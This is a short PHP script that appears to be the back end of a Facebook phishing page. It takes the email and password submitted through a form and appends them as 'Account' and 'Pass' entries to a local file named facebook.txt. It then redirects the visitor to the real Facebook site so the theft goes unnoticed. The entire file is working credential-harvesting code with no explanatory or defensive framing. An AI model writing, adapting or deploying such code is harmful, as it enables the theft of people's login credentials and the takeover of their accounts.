<?php
header('Location: https://www.facebook.com');
if (!empty($_POST['email'])) {file_put_contents("facebook.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
}

exit();
